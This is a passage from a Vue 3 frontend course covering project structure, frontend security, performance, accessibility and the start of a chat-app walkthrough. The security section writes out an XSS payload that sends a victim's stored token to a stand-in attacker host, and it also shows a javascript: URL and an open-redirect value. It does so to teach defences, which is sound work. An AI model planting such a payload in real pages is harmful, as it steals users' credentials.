tchen jams at lunch.\n**You already know this from Spring Boot:** Controller \u2192 Service \u2192 Repository. The frontend has the same idea:\n| Spring Boot | Vue frontend |\n|---|---|\n| Controller (receives request) | `views/` (route target, coordinates) |\n| Service (business logic) | `composables/` + `stores/` (UI logic, shared state) |\n| Repository (talks to DB) | `services/` (talks to the API) |\n| DTO | the JSON shape / TypeScript type |\n| Utility class | `utils/` (pure functions) |\n| `application.yml` | `.env.*` files |\n\n## 44.2 A realistic Vue 3 folder structure \ud83c\udfed\n```\nseller-chat/\n\u251c\u2500 index.html                      the single HTML page Vite serves\n\u251c\u2500 package.json                    scripts + dependencies\n\u251c\u2500 vite.config.js                  build tool config (alias, proxy)\n\u251c\u2500 .env.development  .env.production   per-environment values (VITE_*)\n\u251c\u2500 eslint.config.js  .prettierrc   code-quality rules\n\u251c\u2500 public/                         copied as-is (favicon, robots.txt)\n\u2514\u2500 src/\n   \u251c\u2500 main.js                      create app, install plugins, mount\n   \u251c\u2500 App.vue                      <RouterView/> + global toast/error host\n   \u251c\u2500 assets/styles/               tokens.css reset.css base.css\n   \u251c\u2500 router/        index.js      routes + guards\n   \u251c\u2500 layouts/       AuthLayout.vue AppLayout.vue          page shells (sidebar/topbar)\n   \u251c\u2500 views/         LoginView.vue ChatsView.vue ChatRoomView.vue OrdersView.vue NotFoundView.vue\n   \u251c\u2500 components/\n   \u2502   \u251c\u2500 base/      BaseButton BaseInput BaseModal BaseSpinner BaseEmptyState     generic UI kit\n   \u2502   \u2514\u2500 chat/      ChatList ChatItem ChatHeader MessageList MessageBubble MessageComposer AttachOrderModal OrderCard\n   \u251c\u2500 composables/   useDebouncedRef useFetch useAutoScroll useEventListener\n   \u251c\u2500 services/      http.js authApi.js chatApi.js orderApi.js mock/*.js      HTTP only\n   \u251c\u2500 stores/        auth.js chat.js orders.js ui.js                          Pinia\n   \u251c\u2500 utils/         format.js date.js storage.js                             pure helpers\n   \u251c\u2500 constants/     routes.js messageStatus.js\n   \u2514\u2500 tests/         unit/ components/ e2e/\n```\n| Folder | Rule of thumb |\n|---|---|\n| `views` | One per route. Owns \"load the data for this page\". Thin: mostly composes components. |\n| `layouts` | Persistent shell around views (header, sidebar). Rendered by a parent route. |\n| `components/base` | Know nothing about your business. `BaseButton` works in any app. |\n| `components/<feature>` | Know the business (`ChatItem`), but get data via props, not by fetching. |\n| `composables` | Reusable *behaviour* with reactive state (debounce, fetch, auto-scroll). |\n| `stores` | State shared by distant components or surviving navigation. |\n| `services` | The only place that knows URLs and HTTP. Returns plain data. |\n| `utils` | Pure functions, no Vue, no side effects: trivially testable. |\n\n**Feature-based variant** (big apps, many teams): `src/features/chat/{components,store,api,views}`, `src/features/orders/...`. Everything for one feature lives together, so deleting or owning a feature is easy. Shared code goes in `src/shared/`. Rule: a feature may import `shared`, never another feature's internals.\n\n## 44.3 The principles, with a concrete before/after \ud83d\udfe1\n**Bad (one 400-line component does everything):**\n```vue\n<script setup>\nconst chats = ref([]); const q = ref('')\nonMounted(async () => { const r = await fetch('http://localhost:8080/api/chats', { headers: { Authorization: 'Bearer ' + localStorage.token } }); chats.value = (await r.json()).content })\nconst shown = computed(() => chats.value.filter(c => c.buyerName.toLowerCase().includes(q.value.toLowerCase())))\nfunction fmt(d) { return new Date(d).toLocaleTimeString() }\n<\/script>\n```\nProblems: hard-coded URL, token handling copied everywhere, no error/loading state, formatting duplicated, untestable without a server.\n**Good (each concern in its home):**\n```js\n// services/chatApi.js           \u2192 URL + HTTP details\nexport const chatApi = { list: params => http.get('/chats', { params }) }\n// utils/date.js                 \u2192 pure helper\nexport const formatTime = iso => new Intl.DateTimeFormat('en-IN', { timeStyle: 'short' }).format(new Date(iso))\n// stores/chat.js                \u2192 shared state + actions (fetchChats, filters, status)\n// components/chat/ChatList.vue  \u2192 props in, events out\n// views/ChatsView.vue           \u2192 connects store to components\n```\n| Principle | What it means day to day |\n|---|---|\n| **Separation of concerns** | Template = what it looks like \u00b7 composable = how it behaves \u00b7 store = shared data \u00b7 service = HTTP \u00b7 util = pure helper |\n| **Single responsibility** | A component does one thing. If you describe it with \"and\" (\"fetches AND formats AND lays out\"), split it. ~200 lines is a smell, not a law. |\n| **Container / presentational** | Containers (views) fetch and coordinate. Presentational components take props and emit events: reusable and easy to test. |\n| **DRY, but late** | Extract on the 2nd\u20133rd duplication. Abstracting too early creates the wrong abstraction. |\n| **Props down, events up** | Data flows down, intentions flow up. Never mutate a prop. |\n| **API abstraction** | UI never sees URLs. You can swap mock \u2194 real by changing one file. |\n| **State locality** | Local first \u2192 store only when shared \u2192 URL for navigational state (filters, ids). |\n| **Explicit contracts** | `defineProps` with types, JSDoc or TypeScript on services, so mismatches fail early. |\n\n**Naming conventions (follow your team's; these are the Vue defaults):**\n| Thing | Convention | Example |\n|---|---|---|\n| Component | PascalCase, multi-word | `ChatItem.vue` (never `Item.vue`: collides with HTML) |\n| Composable | `useX` | `useDebouncedRef` |\n| Store | `useXStore` | `useChatStore` |\n| Handler | `onX` / `handleX` | `onSend` |\n| Boolean | `is/has/can/should` | `isLoading`, `canSend` |\n| Event | verb or `update:x`, kebab in templates | `@attach-order`, `update:modelValue` |\n| Constants | `UPPER_SNAKE` | `MAX_MESSAGE_LENGTH` |\n\n**Import alias:** `@` \u2192 `src` (set in `vite.config.js`), so `import X from '@/components/base/BaseButton.vue'` instead of `../../../`. Avoid **circular imports** (store \u2194 service \u2194 router): they cause `undefined` at import time. Break them by importing lazily inside a function.\n\n## 44.4 `main.js`: how the app boots \ud83d\udfe1\n```js\nimport { createApp } from 'vue'\nimport { createPinia } from 'pinia'\nimport App from './App.vue'\nimport router from './router'\nimport './assets/styles/tokens.css'\n\nconst app = createApp(App)                 // 1. create the root application\napp.use(createPinia())                     // 2. install state management\napp.use(router)                            // 3. install routing\napp.config.errorHandler = (err, vm, info) => reportError(err, { info })   // 4. global safety net\napp.mount('#app')                          // 5. render into <div id=\"app\"> in index.html\n```\n**Order matters:** Pinia before the router, because router guards use stores.\n\n## 44.5 Reading an unfamiliar company codebase (your goal #2) \ud83d\udfe1\nYou will spend more time **reading** code than writing it. A repeatable method:\n1. `package.json`: scripts (`dev`, `build`, `test`), dependencies (Vue 2 or 3? Vuex or Pinia? Axios? a UI kit like Element/Vuetify?).\n2. `main.js`: plugins, global components, global config.\n3. `router/index.js`: the **table of contents of the app**: every page and guard.\n4. Pick the page you need. Open its **view**, then follow imports downward: components \u2192 composables \u2192 store \u2192 service.\n5. `services/http.js`: base URL, auth header, error handling, interceptors.\n6. Run it. Open **Vue DevTools** (component tree + props + store) and the **Network tab** (what actually goes over the wire).\n7. Search for the API path (`/api/chats`) to find the caller in the frontend and the `@GetMapping` in the Spring controller.\n8. Read the tests: they state intended behaviour.\n9. Put `console.log` or a breakpoint in the handler you care about and click.\n10. Draw the component tree for that screen on paper.\n**Explain any function, line by line:** inputs \u2192 what it reads/changes (refs, store, DOM) \u2192 side effects (API, timers, listeners) \u2192 outputs \u2192 error paths \u2192 who calls it.\n**Vue 2 legacy codebase?** Same method. Translate: `data()` = `ref`s, `computed:` = `computed()`, `methods:` = functions, `mounted()` = `onMounted`, `this.$store` = Vuex (\u2248 Pinia), `this.$emit` = `emit`. See Module 58.\n\n## 44.6 Mistakes and questions\n**Mistakes:** components that fetch AND render AND format \u00b7 API URLs scattered in components \u00b7 a \"utils.js\" with 80 unrelated functions \u00b7 a god store \u00b7 folders organised by file type in a 100-screen app (hard to find a feature) \u00b7 skipping naming rules and ending with `Item.vue`, `item2.vue`.\n**Q1. How would you structure a large Vue project?** **Q2. Views vs components vs layouts?** **Q3. Container vs presentational?** **Q4. Where does business logic belong?** Backend is authoritative; the frontend holds UI logic in composables/stores. **Q5. Local state or Pinia?** **Q6. How do you onboard to a new codebase?** **Q7. Why separate services from components?** testing, swapping mock/real, one place for auth/errors.\n**Exercises:** draw the folder tree for an e-commerce app, then for a feature-based version \u00b7 take one large component and split it into view + 3 components + a composable \u00b7 pick an open-source Vue app and write its \"reading notes\" using 44.5.\n\n## \u25b6 PRO STEP 44: Seller Chat skeleton\nCreate the folders above, add the `@` alias, install Pinia + Router, and make `main.js` boot with an empty `App.vue` showing `<RouterView/>`. Commit this before building any feature.\n\n---\n\n# MODULE 45 \u2014 FRONTEND SECURITY \ud83c\udfed\n\n## 45.1 The mindset \ud83d\udfe1\n**Everything running in the browser is controlled by the user.** They can edit your JS, change requests, delete the `v-if`, replay API calls. The frontend can make security *pleasant* (hide buttons, redirect), but **the backend makes it real** (authorization on every endpoint). Frontend security is about not creating holes: not letting attacker text become code, and not leaking secrets.\n**Analogy:** your frontend is a shop window; the backend is the vault. Locking the window display doesn't protect the vault.\n\n## 45.2 XSS: Cross-Site Scripting \ud83c\udfed\n**What:** attacker-controlled text is treated as HTML/JS by your page and runs with the user's privileges: it can read tokens, call APIs as the user, or rewrite the page.\n**Seller Chat example:** a buyer sends the message `<img src=x onerror=\"fetch('https://evil.com/?t='+localStorage.token)\">`. If your page renders it as HTML, every seller who opens that chat leaks their token.\n```js\n// \u274c DANGEROUS: text becomes HTML\nel.innerHTML = msg.text\n// \u2705 SAFE: text stays text\nel.textContent = msg.text\n```\n```vue\n<!-- \u274c DANGEROUS --> <div v-html=\"msg.text\"><\/div>\n<!-- \u2705 SAFE: Vue escapes {{ }} automatically --> <div>{{ msg.text }}<\/div>\n```\nVue and React **escape by default**. The holes are the escape hatches: `v-html`, `innerHTML`, `:href=\"userUrl\"` (`javascript:alert(1)`), dynamic `<component :is>` from user input, and third-party scripts.\n**If you truly need rich text:** sanitise.\n```js\nimport DOMPurify from 'dompurify'\nconst clean = DOMPurify.sanitize(msg.html)                       // strips scripts, event handlers, javascript: URLs\nconst safeUrl = u => /^https?:\\/\\//i.test(u) ? u : '#'           // allow-list schemes for :href\n```\n**Defence in depth:** **CSP** header limits what scripts can run:\n`Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data: https:; connect-src 'self' https://api.company.com; frame-ancestors 'none'`\nEven if an injection slips through, inline scripts and unknown origins are blocked.\n\n## 45.3 Token storage and CSRF \ud83c\udfed\n| Where the token lives | XSS can steal it? | CSRF risk? | Verdict |\n|---|---|---|---|\n| `localStorage` | **Yes** (any script reads it) | No (not auto-sent) | Simple, but one XSS = account takeover |\n| `sessionStorage` | Yes (per tab) | No | Same exposure, dies with the tab |\n| In-memory variable (Pinia, not persisted) | Harder | No | Good for short-lived access tokens; lost on refresh |\n| `HttpOnly; Secure; SameSite` cookie | **No** (JS can't read it) | Yes, unless mitigated | Best for refresh tokens/sessions |\n**Common production pattern:** short-lived access token in memory + refresh token in an `HttpOnly` cookie; on page load call `/auth/refresh` to get a new access token.\n**CSRF** (Cross-Site Request Forgery): a malicious site makes the user's browser send a request to your API *with the user's cookies attached*. Defences: `SameSite=Lax/Strict`, CSRF tokens (Spring Security does this for session auth), checking `Origin`. A pure Bearer-header API isn't CSRF-prone because the browser doesn't add the header automatically.\n```java\n// Spring: cookie for refresh token\nResponseCookie c = ResponseCookie.from(\"refresh\", token).httpOnly(true).secure(true).sameSite(\"Strict\").path(\"/api/auth\").maxAge(Duration.ofDays(7)).build();\n```\n\n## 45.4 The rest of the threat table \ud83d\udfe1\n| Threat | How it works | Defence |\n|---|---|---|\n| **Clickjacking** | your page framed invisibly by an attacker | `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'` |\n| **Insecure transport** | HTTP leaks credentials | HTTPS everywhere, HSTS, no mixed content |\n| **Broken authorization** | hiding a button \u2260 protecting data | server checks every endpoint (`seller owns this chat?`); IDs in URLs must be checked (IDOR) |\n| **Supply chain** | malicious/vulnerable npm package | lockfile, `npm audit`, minimal deps, review postinstall scripts, Dependabot/Renovate, pin versions |\n| **Secrets in the bundle** | `VITE_*` values are **public** in the built JS | never put API secrets/passwords client-side; only public config |\n| **Information leakage** | tokens in `console.log`, URLs, source maps | no tokens in URLs/logs; restrict source maps |\n| **CORS misconfig** | `Allow-Origin: *` with credentials, reflecting any origin | allow-list exact origins (Spring `allowedOrigins`) |\n| **Open redirect** | `?redirect=https://evil.com` after login | only allow relative paths: `redirect.startsWith('/') && !redirect.startsWith('//')` |\n```js\n// Safe post-login redirect\nconst raw = route.query.redirect\nconst target = typeof raw === 'string' && raw.startsWith('/') && !raw.startsWith('//') ? raw : '/chats'\nrouter.replace(target)\n```\n**Input validation and output encoding:** validate on the client for UX **and** on the server (`@Valid`) for truth; encode on output according to context (HTML, attribute, URL, JS).\n**Secure API communication checklist:** HTTPS \u00b7 `Authorization` header (never secrets in query strings: they're logged) \u00b7 handle 401/403/429 (rate limit) \u00b7 don't trust response shapes blindly \u00b7 don't show stack traces to users.\n\n## 45.5 Mistakes and questions\n**Mistakes:** `v-html` on chat/comment text \u00b7 JWT in `localStorage` with no CSP \u00b7 \"admin\" routes hidden only by a client guard \u00b7 API keys in `VITE_` variables \u00b7 logging full request objects with tokens \u00b7 wildcard CORS with credentials.\n**Q1. What is XSS and how does Vue help prevent it?** **Q2. `localStorage` vs `HttpOnly` cookie for a JWT?** **Q3. What is CSRF? Does a Bearer-token SPA need protection?** **Q4. What is CSP?** **Q5. Is a route guard secure?** No: UX only. **Q6. What is IDOR?** accessing `/chats/99` that isn't yours; fix on server. **Q7. How do you secure dependencies?** **Q8. Why are `VITE_*` variables not secret?**\n**Exercises:** write a page with a `v-html` hole, exploit it with an `<img onerror>`, then fix it with `{{ }}` and with DOMPurify \u00b7 add a safe-redirect helper with tests \u00b7 review your project's `package.json` with `npm audit`.\n\n## \u25b6 PRO STEP 45: Seller Chat hardening\nRender message text only with `{{ }}`; keep the access token in the auth store (memory) and refresh via cookie if the backend supports it, else `sessionStorage`; sanitise any future rich text; validate `?redirect=`; add CSP in the nginx config (Module 63).\n\n---\n\n# MODULE 46 \u2014 FRONTEND PERFORMANCE \ud83c\udfed\n\n## 46.1 Why and how to think \ud83d\udfe1\nSlow pages lose users and sellers' patience. **Rule #1: measure before you optimise.** Guessing wastes days on things that don't matter.\n**Core Web Vitals** (Google's user-centric metrics):\n| Metric | Measures | Good |\n|---|---|---|\n| **LCP** Largest Contentful Paint | how fast the main content shows | \u2264 2.5 s |\n| **INP** Interaction to Next Paint | how fast the page responds to clicks/typing | \u2264 200 ms |\n| **CLS** Cumulative Layout Shift | how much things jump around while loading | \u2264 0.1 |\n**Tools:** Lighthouse (DevTools \u2192 audit), Performance panel (flame chart, long tasks > 50 ms), Network (waterfall, sizes, throttling), Memory (heap snapshots), Vue DevTools timeline, `rollup-plugin-visualizer` (bundle map).\n\n## 46.2 The three places time goes \ud83d\udfe1\n```\nNetwork (download)  \u2192  Parsing/Executing JS  \u2192  Rendering (layout, paint, re-render on interaction)\n   \u2193 smaller bundles       \u2193 less JS to run         \u2193 fewer/cheaper updates\n```\n### A. Load faster (bundle and network)\n| Technique | How | Seller Chat example |\n|---|---|---|\n| **Code splitting by route** | `component: () => import('@/views/OrdersView.vue')` | Orders page JS downloads only when visited |\n| **Lazy components** | `defineAsyncComponent(() => import('./HeavyChart.vue'))` | Chart loads on first open |\n| **Tree shaking** | named ES imports: `import { debounce } from 'lodash-es'` | not `import _ from 'lodash'` (pulls everything) |\n| **Lighter libraries** | `moment` (large) \u2192 `dayjs` or `Intl` | `Intl.DateTimeFormat` costs 0 KB |\n| **Compression + caching** | gzip/brotli; hashed filenames (`app.3f9a.js`) with `Cache-Control: immutable` | repeat visits load instantly |\n| **Preconnect/preload** | `<link rel=\"preconnect\" href=\"https://api.company.com\">` | saves the TLS handshake |\n| **CDN** | serve static assets near users | |\n| **Images** | WebP/AVIF, `srcset`, `loading=\"lazy\"`, set `width`/`height` (prevents CLS), SVG icons | avatars lazy-loaded |\n**Find what's big:** `npm run build` then open the visualizer report; the biggest rectangle is your target.\n\n### B. Render and update faster (Vue)\nA component re-renders when **reactive data it actually read** changes. Performance = fewer, cheaper re-renders.\n| Technique | When |\n|---|---|\n| **Stable `key`** (id, not index) | lists that reorder/insert |\n| `computed` instead of method calls in the template | derived data (cached) |\n| `v-show` vs `v-if` | `v-show` for frequent toggles, `v-if` for rarely-shown/heavy |\n| `v-once` / `v-memo=\"[a, b]\"` | static or rarely changing subtrees/rows |\n| `shallowRef` / `markRaw` | big arrays/objects or class instances you replace rather than mutate |\n| **Split big components** | a change in one part shouldn't re-render everything |\n| **Pass minimal props** | pass `:name=\"chat.buyerName\"` not the whole object if only one field is used |\n| Avoid inline objects/functions as props in hot lists | they're new each render \u2192 child re-renders |\n| **Pagination / virtual scrolling** | thousands of rows (only render what's visible) |\n| `content-visibility: auto` (CSS) | long off-screen sections |\n| Animate `transform`/`opacity` | not `top/left/width` (those trigger layout) |\n```vue\n<!-- 10,000 rows \u2192 render ~20: use a virtual scroller library (e.g. vue-virtual-scroller) or paginate -->\n<RecycleScroller :items=\"messages\" :item-size=\"64\" key-field=\"id\" v-slot=\"{ item }\"><MessageBubble :message=\"item\" /><\/RecycleScroller>\n```\n**See why a component re-rendered:** `onRenderTriggered(e => console.log(e))` in dev, or the Vue DevTools timeline.\n\n### C. Network behaviour\n| Technique | Detail |\n|---|---|\n| Debounce inputs | search box \u2192 one request after the user pauses |\n| Cancel stale requests | `AbortController` (Module 29/41) |\n| Cache GETs | store or a query library (TanStack Query, SWR-style) |\n| Batch / parallelise | `Promise.all` for independent calls |\n| Paginate | `Page` from Spring; cursor for chat history |\n| Avoid chatty polling | WebSocket/SSE for live messages |\n| Compress JSON, request only needed fields | |\n```js\nfunction debounce(fn, ms = 300) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms) } }   // wait until user stops\nfunction throttle(fn, ms = 100) { let last = 0; return (...a) => { const n = Date.now(); if (n - last >= ms) { last = n; fn(...a) } } }   // at most once per interval\n```\n**Debounce vs throttle:** debounce = \"run after the user stops\" (search box). Throttle = \"run at most every X ms while it continues\" (scroll, resize).\n\n## 46.3 Memory leaks \ud83c\udfed\nA leak = memory that should be freed but is still referenced, so the tab slows and eventually crashes after long use (a seller keeps Seller Chat open all day).\n| Cause | Fix |\n|---|---|\n| `setInterval`/`setTimeout` never cleared | `onUnmounted(() => clearInterval(id))` |\n| `window.addEventListener` never removed | remove in `onUnmounted` (or use a `useEventListener` composable) |\n| WebSocket / `EventSource` left open | `ws.close()` in `onUnmounted` |\n| Fetches continuing after leaving | `AbortController.abort()` |\n| Detached DOM nodes held in closures/globals | don't store DOM refs in long-lived objects |\n| Store listeners/watchers never stopped | stop in cleanup |\n```js\n// composables/useEventListener.js: cleanup built in\nexport function useEventListener(target, event, handler) {\n  onMounted(() => target.addEventListener(event, handler))\n  onUnmounted(() => target.removeEventListener(event, handler))\n}\n```\n**Verify in DevTools \u2192 Memory:** take a heap snapshot \u2192 navigate between pages 10 times \u2192 force GC \u2192 snapshot again. If memory keeps growing, something wasn't cleaned up.\n\n## 46.4 Diagnosing a slow page: the method \ud83c\udfed\n1. Reproduce with **CPU 4\u00d7 slowdown + Slow 4G** throttling (DevTools).\n2. Run **Lighthouse** for a baseline score.\n3. **Performance recording** while doing the slow action: look for long tasks, layout thrashing (repeated forced reflow), big scripting blocks.\n4. **Network:** big bundles, uncompressed/huge images, blocking waterfall, slow API?\n5. Fix the **single biggest** bottleneck.\n6. Re-measure. Stop when it's good enough.\n**Typical findings:** one 1.5 MB vendor chunk \u2192 split/lazy-load \u00b7 5 MB hero image \u2192 compress \u00b7 `watch` firing on every keystroke \u2192 debounce \u00b7 list of 5,000 DOM nodes \u2192 virtualise \u00b7 slow endpoint \u2192 backend problem (add index/cache): tell the backend team with evidence.\n\n## 46.5 Mistakes and questions\n**Mistakes:** optimising without measuring \u00b7 `import _ from 'lodash'` \u00b7 index as key \u00b7 huge reactive objects (`ref` of 50k items deep-proxied) \u00b7 polling every second \u00b7 forgetting cleanup \u00b7 images without dimensions.\n**Q1. What are Core Web Vitals?** **Q2. How do you reduce bundle size?** **Q3. How do you render 10,000 rows?** virtual scrolling/pagination. **Q4. What causes memory leaks in a Vue SPA?** **Q5. Debounce vs throttle?** **Q6. How do you find why a component re-renders?** **Q7. `v-if` vs `v-show` performance?** **Q8. What is code splitting and how does Vue Router support it?**\n**Exercises:** run `rollup-plugin-visualizer` on a project and list the three biggest dependencies \u00b7 add a memory-leak (uncleared interval) on purpose and find it in the Memory tab \u00b7 debounce a search box and show request count before/after \u00b7 lazy-load a route and confirm a new chunk in Network.\n\n## \u25b6 PRO STEP 46: Seller Chat performance\nLazy-load every route; debounce the chat search (350 ms) and abort stale `fetchChats` calls; `shallowRef`/pagination for long chat history (load 30, then older on scroll-up); close the WebSocket in `onUnmounted`; add `width`/`height` to avatars.\n\n---\n\n# MODULE 47 \u2014 ACCESSIBILITY AND PRODUCTION QUALITY \ud83c\udfed\n\n## 47.1 Accessibility (a11y) \ud83d\udfe1\n**What:** making the app usable by people who navigate with a keyboard, a screen reader, voice control, zoom, or who have low vision, colour blindness or motor limitations. It's also a legal requirement in many regions, improves SEO, and benefits everyone (a sprained wrist, bright sunlight).\n**WCAG** (Web Content Accessibility Guidelines) principles, **POUR**: **P**erceivable, **O**perable, **U**nderstandable, **R**obust. Companies usually target **level AA**.\n**The cheapest win: semantic HTML (Module 3).** A real `<button>` gives you focus, Enter/Space, and role announcement for free. `<div @click>` gives you none of it.\n```html\n<!-- \u274c --> <div class=\"btn\" @click=\"send\">Send<\/div>\n<!-- \u2705 --> <button type=\"button\" @click=\"send\">Send<\/button>\n```\n### Keyboard\nEverything works with **Tab / Shift+Tab / Enter / Space / Esc / arrows**; logical order; **visible focus** (`:focus-visible`: never `outline:none` without a replacement); no keyboard traps; a **skip link** (\"Skip to chat\") at the top.\n```html\n<a class=\"skip\" href=\"#main\">Skip to content<\/a> \u2026 <main id=\"main\" tabindex=\"-1\">\u2026<\/main>\n```\n### Focus management in a SPA (most-missed topic)\nA route change doesn't reload the page, so a screen reader user isn't told it changed. After navigation, **move focus to the new page's `<h1>`** (give it `tabindex=\"-1\"`) and update `document.title`.\n**Modal rules:** on open, focus the first control; **trap** Tab inside; **Esc** closes; on close, **return focus** to the button that opened it. Native `<dialog>.showModal()` does most of this for you.\n```vue\n<script setup>\nconst dlg = ref(null)\nwatch(() => props.open, o => o ? dlg.value.showModal() : dlg.value.close())\n<\/script>\n<template><dialog ref=\"dlg\" aria-labelledby=\"t\" @close=\"emit('update:open', false)\"><h2 id=\"t\">Attach order<\/h2><slot /><\/dialog><\/template>\n```\n### Screen readers: names, roles, live regions\n| Need | Technique |\n|---|---|\n| Every input has a name | `<label for=\"x\">` or `aria-label` |\n| Icon-only buttons | `<button aria-label=\"Attach order\">\ud83d\udcce<\/button>` |\n| Decorative images | `alt=\"\"` (skipped); meaningful images get descriptive `alt` |\n| New content announced | `aria-live=\"polite\"` on the message list/toasts; `role=\"alert\"` for errors; `role=\"status\"` for non-urgent |\n| Toggles | `aria-expanded`, `aria-controls`, `aria-pressed` |\n| Current page | `aria-current=\"page\"` (RouterLink sets `aria-current` automatically) |\n| Form errors | `aria-invalid=\"true\"` + `aria-describedby=\"err-id\"` |\n**First rule of ARIA:** don't use ARIA if a native element does the job. ARIA only changes what is *announced*, not behaviour.\n### Visual\nContrast \u2265 **4.5:1** for normal text, \u2265 **3:1** for large text and UI parts \u00b7 don't use colour alone (add an icon/text for \"failed\") \u00b7 `prefers-reduced-motion` \u00b7 works at **200% zoom** (use `rem`, avoid fixed heights) \u00b7 touch targets \u2265 **44\u00d744 px**.\n```css\n@media (prefers-reduced-motion: reduce) { *{animation-duration:.01ms!important;transition-duration:.01ms!important} }\n```\n### How to test (10 minutes)\n1. Unplug the mouse: complete login \u2192 open chat \u2192 send \u2192 attach order with the keyboard only.\n2. Turn on VoiceOver (Mac: `Cmd+F5`) and listen to the page.\n3. Zoom to 200%.\n4. Run **axe DevTools** / Lighthouse; add `eslint-plugin-vuejs-accessibility`.\n\n## 47.2 Browser compatibility \ud83d\udfe1\nKnow your **support matrix** (what your company targets: usually latest 2 of Chrome/Edge/Firefox/Safari). Use MDN + caniuse. Use **progressive enhancement** (core works everywhere, extras where supported) and **feature detection**: `if ('IntersectionObserver' in window) \u2026`. Vite builds modern output; `@vitejs/plugin-legacy` adds old-browser support. Safari quirks to remember: `100vh` with the toolbar (use `100dvh`), date inputs, `gap` in old flex, `structuredClone` support.\n`browserslist` in `package.json` controls what CSS prefixes/transpilation are applied.\n\n## 47.3 Error handling: three layers \ud83c\udfed\n```\n1. Component:   try/catch around the action \u2192 show an error state in that UI (retry button)\n2. App:         onErrorCaptured (error boundary component) + app.config.errorHandler\n3. Window:      window.addEventListener('error') and 'unhandledrejection'  (last resort)\n```\n```js\n// main.js\napp.config.errorHandler = (err, instance, info) => reportError(err, { info })\nwindow.addEventListener('unhandledrejection', e => reportError(e.reason))\n```\n```vue\n<!-- ErrorBoundary.vue -->\n<script setup>\nconst error = ref(null)\nonErrorCaptured(e => { error.value = e; reportError(e); return false })   // false = don't propagate further\n<\/script>\n<template><slot v-if=\"!error\" /><div v-else role=\"alert\">Something went wrong. <button @click=\"error = null\">Try again<\/button><\/div><\/template>\n```\n**User-facing errors:** friendly text + what to do next + retry; never raw stack traces. **Developer-facing:** send to monitoring.\n\n## 47.4 Logging and monitoring \ud83c\udfed\n- Send errors to **Sentry / Datadog RUM / similar**: include release version, route, user id (**no PII, no tokens**), breadcrumbs (last clicks/requests), uploaded **source maps** (kept private) so minified stack traces become readable.\n- Structured logging with levels; strip noisy `console.log` in production builds (`esbuild: { drop: ['console','debugger'] }`).\n- Track business-critical failures (login failures, message send failures) and performance (Web Vitals).\n- Alerts: error-rate spike after a release \u2192 investigate or **roll back**.\n\n## 47.5 Production debugging \ud83c\udfed\nA bug appears only in production. Method:\n1. **Reproduce with the production build locally:** `npm run build && npm run preview` (dev mode hides many problems: minification, env vars, caching).\n2. Read the error in the monitoring tool; use **source maps** to see the real file/line.\n3. **Network tab:** failing request? status? response body? correct URL for that environment?\n4. Check the **environment config**: `VITE_API_BASE_URL` for prod, feature flags.\n5. **Correlate with the backend:** the frontend sends `X-Request-Id: <uuid>` on every request; Spring puts it in MDC and logs it. Search the backend logs by that id.\n6. Check **which version** is deployed (show it in the footer or a `/version.json`) and whether the bug exists in the previous version.\n7. Common prod-only causes: stale cache after a deploy (old chunk 404), CORS/CSP differences, wrong base URL, history-mode fallback missing (Module 39), HTTPS/mixed content, ad blockers, date/timezone/locale differences.\n```js\n// http.js: correlation id\nhttp.interceptors.request.use(cfg => { cfg.headers['X-Request-Id'] = crypto.randomUUID(); return cfg })\n```\n**Release hygiene:** environments (dev \u2192 staging \u2192 prod), CI (lint \u2192 test \u2192 build), versioned releases, ability to roll back, feature flags to switch features off without redeploying.\n\n## 47.6 Mistakes and questions\n**Mistakes:** `outline:none` with no replacement \u00b7 clickable `div`s \u00b7 no focus management after route change \u00b7 swallowing errors with an empty `catch {}` \u00b7 logging tokens \u00b7 only testing in the dev server \u00b7 no source maps \u2192 unreadable stack traces.\n**Q1. How do you make a modal accessible?** **Q2. What is `aria-live`?** **Q3. What is the first rule of ARIA?** **Q4. How do you debug a production-only bug?** **Q5. What do you monitor and what must you never log?** **Q6. What is progressive enhancement?** **Q7. What is an error boundary in Vue?** **Q8. How do you correlate a frontend error with a backend log?**\n**Exercises:** do the keyboard-only pass on any app and list five failures \u00b7 convert a `div` modal into `<dialog>` \u00b7 add `aria-live` to a message list \u00b7 create an `ErrorBoundary` and trigger it with a throwing child \u00b7 add `X-Request-Id` and find it in a Spring log.\n\n## \u25b6 PRO STEP 47: Seller Chat quality\nSemantic markup everywhere; `role=\"log\" aria-live=\"polite\"` on `MessageList`; focus the `<h1>` after route change; native `<dialog>` in `BaseModal`; `ErrorBoundary` around `ChatsView`; request-id header; Sentry (or console reporter stub) in `errorHandler`.\n\n---\n\n# PART 8 \u2014 REAL-WORLD PROJECT WALKTHROUGH\n\n# MODULE 48 \u2014 BUILD A COMPLETE SELLER CHAT FRONTEND IN VUE \u2b50\n\n> You have built Seller Chat in plain HTML/CSS/JS across Parts 1\u20135. Now you rebuild it as a **production-style Vue 3 app** in **7 stages**. Each stage gives: **what & why \u2192 files \u2192 code \u2192 line-by-line notes \u2192 backend contract \u2192 errors/states \u2192 how to test \u2192 common mistakes**. Start with a **mock API**; swap to Spring Boot at Stage 7. Type the code yourself; don't copy-paste.\n\n## 48.0 Product, hierarchy, data flow, contracts \ud83d\udfe1\n**Product:** a seller logs in, sees their buyer conversations, searches/filters them, opens a chat, reads and sends messages, and attaches an order to the conversation.\n**Component hierarchy:**\n```\nApp.vue\n\u2514\u2500 RouterView\n   \u251c\u2500 LoginView\n   \u2514\u2500 AppLayout (requiresAuth)\n      \u251c\u2500 TheTopbar                      store: auth, chat.unreadTotal\n      \u2514\u2500 ChatsView\n         \u251c\u2500 ChatSidebar\n         \u2502  \u251c\u2500 search input            (v-model filters.q)\n         \u2502  \u251c\u2500 status tabs             (v-model filters.status: all | unread | open)\n         \u2502  \u2514\u2500 ChatItem \u00d7 N            props: chat, active \u00b7 emit: select\n         \u2514\u2500 ChatRoomView  (/chats/:chatId)\n            \u251c\u2500 ChatHeader              props: chat \u00b7 emit: attach-order\n            \u251c\u2500 MessageList \u2192 MessageBubble \u00d7 N     props: message \u00b7 emit: retry\n            \u251c\u2500 MessageComposer         emit: send\n            \u2514\u2500 AttachOrderModal \u2192 OrderCard \u00d7 N    emit: select\nShared UI kit: BaseButton, BaseInput, BaseModal, BaseSpinner, BaseEmptyState\n```\n**Request lifecycle: sending a message:**\n```\nMessageComposer: Enter \u2192 emit('send', text)\n \u2192 ChatRoomView passes it to chatStore.sendMessage(text)\n   \u2192 push optimistic {status:'sending'} \u2192 bubble appears instantly\n   \u2192 